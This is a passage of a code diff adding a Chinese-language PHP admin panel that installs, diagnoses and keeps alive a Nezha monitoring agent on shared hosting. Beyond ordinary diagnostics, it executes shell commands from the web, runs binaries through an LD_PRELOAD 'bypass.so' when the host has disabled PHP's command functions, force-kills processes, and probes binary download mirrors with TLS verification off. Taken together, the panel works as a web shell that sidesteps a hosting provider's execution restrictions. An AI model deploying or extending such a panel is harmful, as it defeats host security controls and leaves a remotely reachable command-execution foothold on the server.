+        if ($fp) {
+            $magic = fread($fp, 4);
+            fclose($fp);
+            $diag[] = "   ELF 格式: " . ($magic === "\x7fELF" ? '✅' : '❌');
+        }
+        if (!empty($EXEC_METHODS)) {
+            $r = runCmd("file " . escapeshellarg($AGENT) . " 2>&1");
+            $diag[] = "   file: " . trim($r['output']);
+        }
+    }
+    $diag[] = "";
+
+    // ===== 5. 配置文件检测 =====
+    $diag[] = "=== 5. 配置文件检测 ===";
+    if (!file_exists($CONFIG)) {
+        $diag[] = "❌ 配置文件不存在";
+    } else {
+        $cfg = file_get_contents($CONFIG);
+        $diag[] = "配置内容:";
+        $diag[] = $cfg;
+        $diag[] = "";
+        $secret_ok = preg_match('/^client_secret:\s*"[^"]+"/m', $cfg);
+        $server_ok = preg_match('/^server:\s*"[^"]+"/m', $cfg);
+        $uuid_ok = preg_match('/^uuid:\s*"[0-9a-f-]{36}"/m', $cfg);
+        $tls_ok = preg_match('/^tls:\s*(true|false)/m', $cfg);
+        $diag[] = "字段检查:";
+        $diag[] = "   client_secret: " . ($secret_ok ? '✅' : '❌ 未设置或格式错');
+        $diag[] = "   server: " . ($server_ok ? '✅' : '❌ 未设置或格式错');
+        $diag[] = "   uuid: " . ($uuid_ok ? '✅' : '❌ 未设置或格式错（需要 36 位 UUID）');
+        $diag[] = "   tls: " . ($tls_ok ? '✅' : '❌ 未设置');
+    }
+    $diag[] = "";
+
+    // ===== 6. 日志（最后 30 行）=====
+    $diag[] = "=== 6. agent 日志（最后 30 行）===";
+    if (!file_exists($LOGFILE)) $diag[] = "❌ 日志不存在（agent 可能从未成功运行）";
+    elseif (filesize($LOGFILE) == 0) $diag[] = "⚠️ 日志为空";
+    else {
+        $lines = array_filter(explode("\n", file_get_contents($LOGFILE)));
+        $diag[] = implode("\n", array_slice($lines, -30));
+    }
+    $diag[] = "";
+
+    // ===== 7. glibc 兼容性 =====
+    $diag[] = "=== 7. glibc 兼容性 ===";
+    if (!empty($EXEC_METHODS) && file_exists($AGENT)) {
+        $r = runCmd("ldd --version 2>&1 | head -1");
+        $diag[] = "ldd: " . trim($r['output']);
+        $r = runCmd("ldd " . escapeshellarg($AGENT) . " 2>&1");
+        $ldd_out = trim($r['output']);
+        $diag[] = "ldd agent: " . $ldd_out;
+        if (strpos($ldd_out, 'not found') !== false) {
+            $diag[] = "❌ 发现 'not found'！glibc 版本不兼容！";
+            $diag[] = "   CentOS 7 的 glibc 太旧 (2.17)，新版 agent 需要更高版本";
+            $diag[] = "   解决：使用兼容版 agent 或静态编译版";
+        }
+        $r = runCmd(escapeshellarg($AGENT) . " --version 2>&1");
+        $diag[] = "agent --version: " . trim($r['output']);
+        if (strpos($r['output'], 'version') === false && strlen(trim($r['output'])) > 0) {
+            $diag[] = "⚠️ agent 无法正常运行，可能 glibc 不兼容";
+        }
+    } else {
+        $diag[] = "⚠️ shell 不可用或 agent 不存在，跳过 glibc 检测";
+    }
+    $diag[] = "";
+
+    // ===== 8. 网络连通性 =====
+    $diag[] = "=== 8. 哪吒 server 连通性 ===";
+    $parts = explode(':', $NZ_SERVER);
+    $nz_host = $parts[0];
+    $nz_port = isset($parts[1]) ? intval($parts[1]) : 443;
+    $diag[] = "目标: $nz_host:$nz_port (tls=$NZ_TLS)";
+    $ip = @gethostbyname($nz_host);
+    if ($ip && filter_var($ip, FILTER_VALIDATE_IP)) {
+        $diag[] = "✅ DNS 解析: $nz_host → $ip";
+        // 检测是否 Cloudflare IP
+        $cf_ranges = ['104.16.', '104.17.', '104.18.', '104.19.', '104.20.', '104.21.', '104.22.', '104.23.', '104.24.', '104.25.', '104.26.', '104.27.', '104.28.', '172.64.', '172.65.', '172.66.', '172.67.', '162.158.', '141.101.', '108.162.', '190.93.', '188.114.', '197.234.', '198.41.'];
+        $is_cf = false;
+        foreach ($cf_ranges as $prefix) {
+            if (strpos($ip, $prefix) === 0) { $is_cf = true; break; }
+        }
+        if ($is_cf) {
+            $diag[] = "⚠️ IP 属于 Cloudflare！gRPC 默认被 CF 拦截";
+            $diag[] = "   解决 1：CF 后台 → Network → 开启 gRPC 开关";
+            $diag[] = "   解决 2：DNS 改成灰云（DNS only）";
+        }
+    } else {
+        $diag[] = "❌ DNS 解析失败: $nz_host";
+    }
+    if (function_exists('fsockopen')) {
+        $start = microtime(true);
+        $fp = @fsockopen($nz_host, $nz_port, $errno, $errstr, 5);
+        $elapsed = round((microtime(true) - $start) * 1000);
+        if ($fp) {
+            $diag[] = "✅ TCP 连接成功 (${elapsed}ms)";
+            if ($NZ_TLS === 'true') {
+                $stream = @stream_socket_client("ssl://$nz_host:$nz_port", $errno, $errstr, 5);
+                if ($stream) {
+                    $diag[] = "✅ TLS 握手成功";
+                    @fclose($stream);
+                } else {
+                    $diag[] = "❌ TLS 握手失败: $errstr";
+                }
+            }
+            @fclose($fp);
+        } else {
+            $diag[] = "❌ TCP 连接失败: $errstr ($errno)";
+        }
+    }
+    $diag[] = "";
+
+    // ===== 9. 进程状态 =====
+    $diag[] = "=== 9. 进程状态 ===";
+    if (!empty($EXEC_METHODS)) {
+        $r = runCmd("ps aux | grep nezha | grep -v grep 2>&1");
+        $diag[] = "ps: " . (trim($r['output']) ?: '未找到 nezha 进程');
+        $r = runCmd("pgrep -a nezha 2>&1");
+        $diag[] = "pgrep: " . (trim($r['output']) ?: '未找到');
+    } else {
+        $p = detectProcess($AGENT, $PIDFILE);
+        $diag[] = "detectProcess: " . ($p['running'] ? "✅ 运行中 (" . implode(',', $p['pids']) . ", method={$p['method']})" : "❌ 未运行");
+    }
+    $diag[] = "";
+
+    // ===== 10. ulimit 检查（v8.10 新增） =====
+    $diag[] = "=== 10. ulimit 进程数限制检查 ===";
+    $ulimit_u = 0;
+    if (is_readable('/proc/self/limits')) {
+        $limits = @file_get_contents('/proc/self/limits');
+        if (preg_match('/Max processes.*?(\d+)/', $limits, $m)) {
+            $ulimit_u = intval($m[1]);
+        }
+    }
+    if (!$ulimit_u && !empty($EXEC_METHODS)) {
+        $r = runCmd("ulimit -u 2>/dev/null");
+        if (is_numeric(trim($r['output']))) $ulimit_u = intval(trim($r['output']));
+    }
+
+    $current_procs = 0;
+    $my_uid = function_exists('posix_getuid') ? @posix_getuid() : 0;
+    if (is_dir('/proc') && is_readable('/proc')) {
+        foreach (@scandir('/proc') ?: [] as $pd) {
+            if (!is_numeric($pd) || $pd < 1) continue;
+            if ($my_uid) {
+                $stat = @file_get_contents("/proc/$pd/status");
+                if ($stat && preg_match('/Uid:\s*(\d+)/', $stat, $m) && intval($m[1]) === $my_uid) {
+                    $current_procs++;
+                }
+            }
+        }
+    }
+
+    if ($ulimit_u > 0) {
+        $diag[] = "ulimit -u (max user processes): $ulimit_u";
+        $diag[] = "当前账号进程数: $current_procs";
+        $diag[] = "剩余槽位: " . ($ulimit_u - $current_procs);
+        $diag[] = "Go 运行时最低需求: ~8 个槽位";
+        $diag[] = "";
+        if ($ulimit_u < 50) {
+            $diag[] = "❌ ulimit 严重过低！Go 运行时会因 newosproc 失败而崩溃";
+            $diag[] = "   错误现象：runtime: failed to create new OS thread (have 2 already; errno=11)";
+            $diag[] = "   解决：";
+            $diag[] = "   ① 联系主机商提高 ulimit -u（推荐 ≥100）";
+            $diag[] = "   ② cPanel 用户：提交工单要求提高 'Max User Processes'";
+            $diag[] = "   ③ 用 .htaccess 加 'RLimitNPROC 100 100' 试试（不一定生效）";
+            $diag[] = "   ④ 终极方案：换 VPS（共享主机天然不适合跑 Go 长驻进程）";
+        } elseif (($ulimit_u - $current_procs) < 8) {
+            $diag[] = "⚠️ 进程槽位不足！Go 启动会失败";
+            $diag[] = "   建议：点「🧹 清理」按钮清理残留进程后再启动";
+        } else {
+            $diag[] = "✅ 进程槽位充足，ulimit 不是问题";
+        }
+    } else {
+        $diag[] = "⚠️ 无法读取 ulimit（可能是 /proc/self/limits 不可读）";
+        $diag[] = "当前账号进程数: $current_procs";
+    }
+    $diag[] = "";
+
+    // ===== 11. 黑针问题诊断 =====
+    $diag[] = "=== 11. 黑针问题诊断（agent 上线但无数据）===";
+    $diag[] = "";
+    $diag[] = "① UUID 不匹配（最常见）";
+    $diag[] = "   - 你 PHP 面板显示的 UUID: $NZ_UUID";
+    $diag[] = "   - 哪吒 Dashboard 后台 → 服务器 → 编辑这台机器 → 复制 UUID";
+    $diag[] = "   - 两个 UUID 必须完全一致";
+    $diag[] = "   - 在本面板「🔑 UUID」区块点「📌 锁定」粘贴正确的 UUID";
+    $diag[] = "";
+    $diag[] = "② client_secret 不匹配";
+    $diag[] = "   - 你 PHP 面板的 secret: " . substr($NZ_SECRET, 0, 4) . "***" . substr($NZ_SECRET, -4);
+    $diag[] = "   - 哪吒 Dashboard 后台 → 设置 → Agent 相关 → 复制 secret";
+    $diag[] = "   - 修改本面板代码开头的 \$NZ_SECRET 常量";
+    $diag[] = "";
+    $diag[] = "③ agent 版本与 server 不兼容";
+    $diag[] = "   - 哪吒 v0/v1 server 必须用 v0 agent";
+    $diag[] = "   - 哪吒 v2 server 必须用 v2 agent（你下载的是 latest = v2.x）";
+    $diag[] = "   - 检查 server 版本：哪吒 Dashboard 后台 → 一般 → 版本";
+    $diag[] = "";
+    $diag[] = "④ Cloudflare 挡了 gRPC";
+    $diag[] = "   - 你的 server 域名: $nz_host";
+    $diag[] = "   - 如果用了 Cloudflare 代理（橙云），默认不转发 gRPC";
+    $diag[] = "   - 解决：CF 后台 → Network → 开启 gRPC 开关";
+    $diag[] = "   - 或者：把 DNS 改成 DNS only（灰云）";
+    $diag[] = "";
+    $diag[] = "⑤ TLS 配置不一致";
+    $diag[] = "   - 你配置: tls=$NZ_TLS";
+    $diag[] = "   - 如果 server 是 nginx 反代 443，必须 tls: true";
+    $diag[] = "   - 如果 server 直接监听 5555 端口，可能需要 tls: false";
+    $diag[] = "";
+
+    $action_result = implode("\n", $diag);
+    $action_type = 'info';
+} elseif ($action === 'try_run') {
+    // 【关键诊断】直接前台运行 agent 5 秒，看实时输出
+    $diag = [];
+    $diag[] = "=== 前台运行 Agent (5秒) ===";
+    $diag[] = "时间: ".date('Y-m-d H:i:s');
+
+    if (!file_exists($AGENT)) {
+        $diag[] = "❌ 二进制不存在";
+    } elseif (!file_exists($CONFIG)) {
+        $diag[] = "❌ 配置不存在，请先点「生成配置」";
+    } else {
+        $diag[] = "Agent: $AGENT";
+        $diag[] = "Config: $CONFIG";
+        $diag[] = "";
+
+        // 用 proc_open 前台运行，5 秒后杀掉
+        if (!empty($EXEC_METHODS)) {
+            $d = [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];
+            // 【关键】加 GOMAXPROCS=1 防止 ulimit -u 限制导致线程创建失败
+            $cmd = 'GOMAXPROCS=1 GOMEMLIMIT=128MiB GODEBUG=asyncpreemptoff=1 GOGC=200 ' . escapeshellarg($AGENT) . ' -c ' . escapeshellarg($CONFIG) . ' 2>&1';
+            $p = @proc_open($cmd, $d, $pipes);
+            if (is_resource($p)) {
+                fclose($pipes[0]);
+                // 非阻塞读取
+                stream_set_blocking($pipes[1], false);
+                stream_set_blocking($pipes[2], false);
+                $output = '';
+                $start = time();
+                while (time() - $start < 5) {
+                    $chunk = fread($pipes[1], 8192);
+                    if ($chunk) $output .= $chunk;
+                    $chunk = fread($pipes[2], 8192);
+                    if ($chunk) $output .= $chunk;
+                    usleep(100000); // 0.1秒
+                    // 检查进程是否已退出
+                    $status = @proc_get_status($p);
+                    if ($status && !$status['running']) {
+                        $diag[] = "⚠️ Agent 在 ".(time()-$start)." 秒后退出！";
+                        $diag[] = "退出码: ".($status['exitcode'] ?? '未知');
+                        break;
+                    }
+                }
+                // 5秒后杀掉（如果还在跑）——必须杀进程组，否则杀不到 Go 二进制
+                $status = @proc_get_status($p);
+                if ($status && $status['running']) {
+                    $try_pid = $status['pid'];
+                    // 杀掉整个进程组（nohup/setsid 启动的进程组不同）
+                    @runCmd("kill -9 $try_pid 2>/dev/null");
+                    // 杀掉所有匹配的 agent 进程
+                    @runCmd("pkill -9 -f " . escapeshellarg($AGENT) . " 2>/dev/null");
+                    @proc_terminate($p, 9);
+                    $diag[] = "✅ Agent 运行了 5 秒仍在跑（正常！已自动停止）";
+                }
+                // 再读一次剩余输出
+                $chunk = fread($pipes[1], 8192);
+                if ($chunk) $output .= $chunk;
+                fclose($pipes[1]); fclose($pipes[2]);
+                @proc_close($p);
+
+                $diag[] = "\n=== Agent 输出 ===";
+                $diag[] = $output ? $output : "(无输出)";
+            } else {
+                $diag[] = "❌ proc_open 失败，无法启动 agent";
+            }
+        } else {
+            // 用 LD_PRELOAD 方式
+            $diag[] = "使用 LD_PRELOAD 方式运行（无法捕获输出）...";
+            $r = ldPreloadExec(escapeshellarg($AGENT) . ' -c ' . escapeshellarg($CONFIG) . ' > ' . escapeshellarg($LOGFILE) . ' 2>&1', $BYPASS_SO, $CMDFILE);
+            sleep(3);
+            if (file_exists($LOGFILE) && filesize($LOGFILE) > 0) {
+                $diag[] = "\n=== Agent 输出 ===";
+                $diag[] = file_get_contents($LOGFILE);
+            } else {
+                $diag[] = "无日志输出";
+            }
+        }
+    }
+    $action_result = implode("\n", $diag);
+    $action_type = 'info';
+}
+// v8.8: deep_diag 已合并到 diagnose
+
+
+$proc = detectProcess($AGENT, $PIDFILE);
+// bypass.so 状态：检查两种文件名
+$bypass_alt = $SCRIPT_DIR . '/nezha_bypass.so';  // 无点前缀的替代名
+$bypass_info = [
+    'exists' => file_exists($BYPASS_SO) || file_exists($bypass_alt),
+    'size' => file_exists($BYPASS_SO) ? filesize($BYPASS_SO) : (file_exists($bypass_alt) ? filesize($bypass_alt) : 0),
+    'real_path' => file_exists($BYPASS_SO) ? $BYPASS_SO : (file_exists($bypass_alt) ? $bypass_alt : ''),
+    'c_exists' => file_exists($BYPASS_SO.'.c') || file_exists($bypass_alt.'.c'),
+];
+$files = ['agent'=>$AGENT, 'config'=>$CONFIG, 'uuid'=>$UUIDFILE, 'pid'=>$PIDFILE, 'log'=>$LOGFILE, 'run.sh'=>$RUNSH, '.htaccess'=>$HTACCESS, 'bypass.so'=>$BYPASS_SO];
+$file_info = [];
+foreach ($files as $name=>$path) { $file_info[$name] = ['path'=>$path, 'exists'=>file_exists($path), 'size'=>file_exists($path)?filesize($path):0, 'exec'=>file_exists($path)&&is_executable($path), 'perm'=>file_exists($path)?substr(sprintf('%o',@fileperms($path)),-4):'']; }
+$recent_log = ''; if (file_exists($LOGFILE)&&filesize($LOGFILE)>0) { $lines=array_filter(explode("\n",file_get_contents($LOGFILE))); $recent_log=implode("\n",array_slice($lines,-30)); }
+$config_content = file_exists($CONFIG)?file_get_contents($CONFIG):'';
+$net = [];
+foreach (['GitHub'=>'https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_amd64.zip','ghgo.xyz'=>'https://ghgo.xyz/https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_amd64.zip','ghproxy'=>'https://mirror.ghproxy.com/https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_amd64.zip'] as $name=>$url) {
+    if (function_exists('curl_init')) { $ch=@curl_init($url); @curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>1,CURLOPT_TIMEOUT=>10,CURLOPT_CONNECTTIMEOUT=>5,CURLOPT_NOBODY=>1,CURLOPT_FOLLOWLOCATION=>1,CURLOPT_SSL_VERIFYPEER=>0,CURLOPT_USERAGENT=>'Mozilla/5.0']); $r=@curl_exec($ch); $c=@curl_getinfo($ch,CURLINFO_HTTP_CODE); $e=@curl_error($ch); @curl_close($ch); $net[$name]=['ok'=>$r!==false&&$c>=200&&$c<400,'code'=>$c,'error'=>$e]; }
+}
+$nz_parts=explode(':',$NZ_SERVER); $nz_host=$nz_parts[0]; $nz_port=isset($nz_parts[1])?intval($nz_parts[1]):5555; $nz_tls='?'; $nz_tcp='?';
+if (function_exists('fsockopen')) { $fp=@fsockopen('ssl://'.$nz_host,$nz_port,$en,$es,5); $nz_tls=$fp?'OK':"$es"; if($fp)fclose($fp); $fp2=@fsockopen($nz_host,$nz_port,$en2,$es2,5); $nz_tcp=$fp2?'OK':"$es2"; if($fp2)fclose($fp2); }
+// 远程保活状态检测（不依赖本地 crontab）
+$keepalive_status = file_exists($SCRIPT_DIR . '/start.php') ? '已开启' : '未开启';
+?>
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>哪吒管理面板 v8.11aa (爆炸修复 + 纯 cron 保活)</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Noto Sans SC',sans-serif;background:#0f172a;color:#e2e8f0;min-height:100vh;padding:16px;font-size:14px}
+.c{max-width:860px;margin:0 auto}h1{text-align:center;font-size:22px;margin-bottom:2px;color:#f8fafc}.sub{text-align:center;font-size:11px;color:#64748b;margin-bottom:16px}
+.p{background:#1e293b;border:1px solid #334155;border-radius:12px;padding:14px;margin-bottom:10px}.p h2{font-size:13px;margin-bottom:8px;color:#94a3b8;display:flex;align-items:center;gap:6px;flex-wrap:wrap}
+.r{display:flex;justify-content:space-between;align-items:center;padding:4px 0;border-bottom:1px solid rgba(51,65,85,0.4)}.r:last-child{border-bottom:none}
+.rl{color:#94a3b8;font-size:12px;min-width:90px;flex-shrink:0}.rv{color:#f1f5f9;font-size:12px;font-family:monospace;text-align:right;word-break:break-all;flex:1;margin-left:6px}
+.b{display:inline-block;padding:2px 8px;border-radius:10px;font-size:10px;font-weight:700;letter-spacing:.5px}
+.bg{background:#16a34a;color:#fff}.br{background:#dc2626;color:#fff}.by{background:#ca8a04;color:#fff}.bgr{background:#475569;color:#fff}.bb{background:#2563eb;color:#fff}.bp{background:#7c3aed;color:#fff}.bc{background:#0891b2;color:#fff}.bpk{background:#ec4899;color:#fff}
+.br2{display:flex;flex-wrap:wrap;gap:6px;margin-top:8px}
+.btn{display:inline-block;padding:6px 14px;border-radius:8px;border:none;font-size:12px;font-weight:600;cursor:pointer;text-decoration:none;color:#fff;transition:opacity .2s;text-align:center}.btn:hover{opacity:.85}
+.btn-g{background:#16a34a}.btn-r{background:#dc2626}.btn-b{background:#2563eb}.btn-gr{background:#475569}.btn-p{background:#7c3aed}.btn-y{background:#ca8a04}.btn-c{background:#0891b2}.btn-pk{background:#ec4899}
+.cb{background:#0f172a;border:1px solid #334155;border-radius:8px;padding:10px;font-family:monospace;font-size:11px;line-height:1.5;color:#94a3b8;max-height:250px;overflow-y:auto;white-space:pre-wrap;word-break:break-all}
+/* 顶部固定日志面板：sticky 固定在视口顶部，所有日志集中显示 */
+.log-top{position:sticky;top:0;z-index:100;background:#1e293b;border:1px solid #0891b2;border-radius:12px;padding:10px;margin-bottom:10px;box-shadow:0 2px 8px rgba(0,0,0,.3)}
+.log-top h2{color:#22d3ee;margin-bottom:6px;font-size:13px;display:flex;justify-content:space-between;align-items:center;gap:6px;flex-wrap:wrap}
+.log-top .cb{max-height:220px;border-color:#0891b2;color:#67e8f9}
+.log-top-empty{color:#64748b;font-size:11px;font-style:italic;padding:6px 0}
+.fg{display:grid;grid-template-columns:1fr 1fr;gap:2px}@media(max-width:600px){.fg{grid-template-columns:1fr}}
+.fi{display:flex;justify-content:space-between;align-items:center;padding:3px 6px;border-radius:3px;font-size:11px}.fi.ok{background:rgba(22,163,74,.1)}.fi.no{background:rgba(220,38,38,.1)}.fi.wn{background:rgba(202,138,4,.1)}.fi.pk{background:rgba(236,72,153,.1)}
+.fn{font-family:monospace;color:#e2e8f0;font-weight:500}.fd{color:#64748b;font-size:10px;margin-left:3px}.fs{font-size:10px;font-weight:700;flex-shrink:0}.fs.ok{color:#22c55e}.fs.no{color:#ef4444}.fs.wn{color:#eab308}.fs.pk{color:#ec4899}
+.rb{background:#0f172a;border-radius:8px;padding:10px;font-family:monospace;font-size:11px;line-height:1.6;white-space:pre-wrap;word-break:break-all;margin-top:6px}.rb.success{border:1px solid #22c55e;color:#86efac}.rb.error{border:1px solid #ef4444;color:#fca5a5}.rb.info{border:1px solid #3b82f6;color:#93c5fd}.rb.warning{border:1px solid #eab308;color:#fde68a}
+.wb{background:rgba(202,138,4,.1);border:1px solid #ca8a04;border-radius:8px;padding:10px;font-size:12px;color:#fbbf24;margin-bottom:10px;line-height:1.5}
+.sb{background:rgba(22,163,74,.1);border:1px solid #16a34a;border-radius:8px;padding:10px;font-size:12px;color:#86efac;margin-bottom:10px;line-height:1.5}
+.ib{background:rgba(37,99,235,.1);border:1px solid #2563eb;border-radius:8px;padding:10px;font-size:12px;color:#93c5fd;margin-bottom:10px;line-height:1.6}
+.ft{text-align:center;color:#334155;font-size:10px;margin-top:14px;padding-bottom:14px}
+.tag{display:inline-block;padding:1px 5px;border-radius:3px;font-size:9px;font-weight:700;margin-left:3px}.t1{background:#7c3aed;color:#fff}.t2{background:#0891b2;color:#fff}.t3{background:#ea580c;color:#fff}.t4{background:#059669;color:#fff}.t5{background:#ec4899;color:#fff}
+.cron-box{background:#0f172a;border:1px solid #334155;border-radius:6px;padding:6px 10px;font-family:monospace;font-size:12px;color:#22c55e;margin-top:4px;user-select:all}
+.divider{border-top:1px solid #334155;margin:8px 0}.uuid-input{background:#0f172a;border:1px solid #334155;border-radius:6px;padding:5px 8px;font-family:monospace;font-size:11px;color:#f1f5f9;width:100%;margin-top:4px}
+
+/* ===== v8.3 新增：Loading 遮罩 ===== */
+.loading-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(15,23,42,.85);backdrop-filter:blur(4px);z-index:2000;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:14px}
+.loading-box{background:#1e293b;border:1px solid #0891b2;border-radius:14px;padding:24px 32px;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,.4);max-width:90vw}
+.spinner{width:42px;height:42px;border:3px solid rgba(8,145,178,.2);border-top-color:#22d3ee;border-radius:50%;margin:0 auto 14px;animation:spin 1s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.loading-text{color:#f1f5f9;font-size:14px;font-weight:600;margin-bottom:4px}
+.loading-hint{color:#64748b;font-size:11px}
+.loading-cancel{margin-top:14px;padding:6px 16px;background:#475569;color:#fff;border:none;border-radius:6px;font-size:11px;cursor:pointer}
+.loading-cancel:hover{background:#64748b}
+
+/* ===== v8.3 新增：Toast ===== */
+.toast-wrap{position:fixed;top:16px;right:16px;z-index:3000;display:flex;flex-direction:column;gap:8px;pointer-events:none}
+.toast{background:#1e293b;border:1px solid #334155;border-radius:8px;padding:10px 14px;color:#f1f5f9;font-size:12px;min-width:220px;max-width:380px;box-shadow:0 4px 12px rgba(0,0,0,.3);animation:toastIn .3s ease;pointer-events:auto}
+.toast.success{border-color:#22c55e;color:#86efac}
+.toast.error{border-color:#ef4444;color:#fca5a5}
+.toast.warning{border-color:#eab308;color:#fde68a}
+.toast.info{border-color:#3b82f6;color:#93c5fd}
+@keyframes toastIn{from{opacity:0;transform:translateX(40px)}to{opacity:1;transform:translateX(0)}}
+
+/* ===== v8.3 新增：文件管理器 3D 翻转 ===== */
+.fm-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:#0f172a;z-index:1500;overflow:auto;display:none;transform-origin:left center;perspective:2000px}
+.fm-overlay.open{display:block;animation:fmFlipIn .5s cubic-bezier(.4,.2,.2,1) forwards}
+.fm-overlay.closing{animation:fmFlipOut .4s cubic-bezier(.4,.2,.2,1) forwards}
+@keyframes fmFlipIn{from{transform:rotateY(-90deg);opacity:0}to{transform:rotateY(0);opacity:1}}
+@keyframes fmFlipOut{from{transform:rotateY(0);opacity:1}to{transform:rotateY(-90deg);opacity:0}}
+.fm-wrap{max-width:1100px;margin:0 auto;padding:16px;min-height:100vh}
+.fm-head{display:flex;align-items:center;justify-content:space-between;gap:10px;margin-bottom:14px;flex-wrap:wrap}
+.fm-title{font-size:18px;color:#f8fafc;font-weight:700}
+.fm-actions{display:flex;gap:6px;flex-wrap:wrap}
+.fm-crumbs{background:#1e293b;border:1px solid #334155;border-radius:8px;padding:8px 12px;margin-bottom:10px;font-family:monospace;font-size:12px;color:#94a3b8;display:flex;align-items:center;gap:4px;flex-wrap:wrap;word-break:break-all}
+.fm-crumb{color:#22d3ee;cursor:pointer;padding:2px 6px;border-radius:4px;text-decoration:none}
+.fm-crumb:hover{background:rgba(34,211,238,.15)}
+.fm-crumb-sep{color:#475569}
+.fm-crumb-current{color:#f1f5f9;font-weight:600;padding:2px 6px}
+.fm-table{width:100%;background:#1e293b;border:1px solid #334155;border-radius:10px;overflow:hidden;border-collapse:collapse}
+.fm-table th{background:#0f172a;color:#64748b;font-size:10px;font-weight:700;padding:8px 10px;text-align:left;text-transform:uppercase;letter-spacing:.5px;border-bottom:1px solid #334155}
+.fm-table td{padding:8px 10px;font-size:12px;color:#e2e8f0;border-bottom:1px solid rgba(51,65,85,.4)}
+.fm-table tr:last-child td{border-bottom:none}
+.fm-table tr:hover td{background:rgba(51,65,85,.3)}
+.fm-name{font-family:monospace;font-size:12px;cursor:pointer;display:flex;align-items:center;gap:6px}
+.fm-name:hover{color:#22d3ee}
+.fm-icon{font-size:14px;flex-shrink:0}
+.fm-size{color:#64748b;font-family:monospace;font-size:11px;text-align:right;white-space:nowrap}
+.fm-perm{color:#94a3b8;font-family:monospace;font-size:11px;text-align:center}
+.fm-time{color:#64748b;font-family:monospace;font-size:10px;white-space:nowrap}
+.fm-ops{display:flex;gap:4px;justify-content:flex-end;flex-wrap:wrap}
+.fm-btn{display:inline-block;padding:3px 8px;border-radius:5px;border:none;font-size:10px;font-weight:600;cursor:pointer;color:#fff;text-decoration:none;white-space:nowrap}
+.fm-btn:hover{opacity:.85}
+.fm-btn-g{background:#16a34a}.fm-btn-b{background:#2563eb}.fm-btn-y{background:#ca8a04}.fm-btn-r{background:#dc2626}.fm-btn-gr{background:#475569}.fm-btn-p{background:#7c3aed}
+.fm-empty{padding:30px;text-align:center;color:#64748b;font-size:12px}
+
+/* ===== v8.3 新增：编辑器模态框 ===== */
+.modal-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.7);z-index:2500;display:flex;align-items:center;justify-content:center;padding:16px}
+.modal-box{background:#1e293b;border:1px solid #334155;border-radius:12px;width:100%;max-width:900px;max-height:90vh;display:flex;flex-direction:column;box-shadow:0 8px 32px rgba(0,0,0,.5)}
+.modal-head{display:flex;justify-content:space-between;align-items:center;padding:12px 16px;border-bottom:1px solid #334155}
+.modal-title{color:#f1f5f9;font-size:13px;font-weight:600;font-family:monospace}
+.modal-body{flex:1;overflow:auto;padding:12px 16px}
+.modal-foot{padding:10px 16px;border-top:1px solid #334155;display:flex;justify-content:flex-end;gap:6px;align-items:center}
+.modal-foot .hint{color:#64748b;font-size:10px;margin-right:auto}
+.editor-textarea{width:100%;height:60vh;background:#0f172a;border:1px solid #334155;border-radius:6px;padding:10px;font-family:'JetBrains Mono',Consolas,monospace;font-size:12px;color:#f1f5f9;line-height:1.6;resize:vertical;tab-size:4}
+.editor-textarea:focus{outline:none;border-color:#22d3ee}
+.input-row{display:flex;gap:6px;align-items:center;flex-wrap:wrap}
+.input-row input[type=text]{flex:1;min-width:200px;background:#0f172a;border:1px solid #334155;border-radius:6px;padding:6px 10px;font-family:monospace;font-size:12px;color:#f1f5f9}
+.input-row input[type=file]{flex:1;min-width:200px;background:#0f172a;border:1px solid #334155;border-radius:6px;padding:6px;font-size:11px;color:#f1f5f9}
+</style>
+</head>
+<body><div class="c">
+<h1>哪吒管理面板 v8.11</h1>
+<p class="sub"><?= htmlspecialchars($NZ_SERVER) ?> | IP: <?= htmlspecialchars($NZ_UUID_IP) ?> | UUID: <?= htmlspecialchars($NZ_UUID) ?></p>
+<div class="sb">🔒 UUID 已锁定 — 保存到 .nezha_uuid，不再随 IP 漂移</div>
+<?php if ($CAN_EXEC && !$LD_PRELOAD_AVAILABLE): ?>
+<div class="sb">✅ <b>命令执行可用</b> (<?= htmlspecialchars($BEST_EXEC) ?>)</div>
+<?php elseif ($CAN_EXEC && $LD_PRELOAD_AVAILABLE): ?>
+<div class="sb">✅ <b>命令执行可用</b> (<?= htmlspecialchars($BEST_EXEC) ?>) + 🔓 LD_PRELOAD 绕过就绪</div>
+<?php elseif (!$CAN_EXEC && $LD_PRELOAD_AVAILABLE): ?>
+<div class="wb">⚠️ 传统命令执行全部被禁，但 <b style="color:#22c55e">LD_PRELOAD 绕过可用</b>！先「准备绕过环境」</div>
+<?php else: ?>
+<div class="wb">❌ 所有执行方式均不可用，只能用 cron</div>
+<?php endif; ?>
+
+<!-- 环境 -->
+<div class="p" id="block-env"><h2>环境</h2>
+<div class="r"><span class="rl">PHP</span><span class="rv"><?= phpversion() ?> (<?= php_sapi_name() ?>)</span></div>
+<div class="r"><span class="rl">架构</span><span class="rv"><?= php_uname('m') ?></span></div>
+<div class="r"><span class="rl">系统</span><span class="rv"><?= php_uname('s').' '.php_uname('r') ?></span></div>
+<div class="r"><span class="rl">最佳方式</span><span class="rv"><?= htmlspecialchars($BEST_EXEC) ?></span></div>
+<div class="r"><span class="rl">LD_PRELOAD</span><span class="rv"><?= $LD_PRELOAD_AVAILABLE?'✅':'❌' ?></span></div>
+<div class="r"><span class="rl">时间</span><span class="rv"><?= date('Y-m-d H:i:s') ?></span></div>
+</div>
+
+<!-- 顶部固定日志面板（sticky）— 所有日志集中显示在这里 -->
+<div class="log-top" id="block-log">
+<h2>
+<span>📋 Agent 日志 <span class="b bc">实时</span></span>
+<span style="font-size:10px;color:#64748b;font-weight:normal"><?= $recent_log ? '最后 '.substr_count($recent_log, "\n").' 行' : '暂无日志' ?></span>
+</h2>
+<?php if($recent_log): ?>
